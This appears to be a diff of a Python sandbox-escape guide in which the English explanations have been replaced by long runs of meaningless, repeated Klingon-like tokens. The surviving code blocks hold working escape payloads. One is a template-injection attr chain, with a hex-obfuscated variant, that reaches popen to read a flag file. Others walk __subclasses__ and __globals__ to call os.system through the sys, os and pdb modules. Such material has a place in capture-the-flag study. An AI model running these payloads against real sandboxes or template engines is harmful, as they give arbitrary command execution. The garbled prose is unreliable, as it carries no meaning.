**ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **ghaH** **'ej** **'ay'** **gh
 ```python
 #You can access the base from mostly anywhere (in regular conditions)
 "".__class__.__base__.__subclasses__()
@@ -506,24 +624,20 @@ defined_func.__class__.__base__.__subclasses__()
 (''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
 (''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
 ```
+### qo'wI' 'e' yIbuS 'ej qay'be'pu' 'e' yIbuS
 
-### Finding dangerous libraries loaded
-
-For example, knowing that with the library **`sys`** it's possible to **import arbitrary libraries**, you can search for all the **modules loaded that have imported sys inside of them**:
-
+mIw **`sys`** **ghItlh** **import arbitrary libraries** **'e' vItlhutlh** **modules loaded** **'e' vItlhutlh** **sys** **'e' **import** **'e' vItlhutlh** **modules** **'e'** **search** **'e'** **jImej**:
 ```python
 [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
 ['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
 ```
-
-There are a lot, and **we just need one** to execute commands:
-
+**ghItlh** **'ej** ***wa'*** **jatlhqa'** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej** **'e'** **vItlhutlh** **'e'** **ghItlh** **'ej
 ```python
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
 ```
+**tlhIngan Hol:**
 
-We can do the same thing with **other libraries** that we know can be used to **execute commands**:
-
+**ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam** **ghItlhvam
 ```python
 #os
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
@@ -558,44 +672,40 @@ We can do the same thing with **other libraries** that we know can be used to **
 #pdb
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
 ```
-
-Moreover, we could even search which modules are loading malicious libraries:
-
+DaH jImej, maHeghDI' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 'e' vItlhutlh 